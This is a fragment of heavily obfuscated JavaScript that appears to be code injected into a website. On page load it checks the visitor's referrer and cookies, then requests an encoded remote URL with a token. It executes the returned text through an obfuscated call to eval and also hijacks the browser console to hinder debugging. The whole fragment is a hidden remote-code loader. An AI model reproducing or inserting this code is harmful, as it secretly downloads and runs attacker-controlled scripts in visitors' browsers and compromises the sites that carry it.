X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};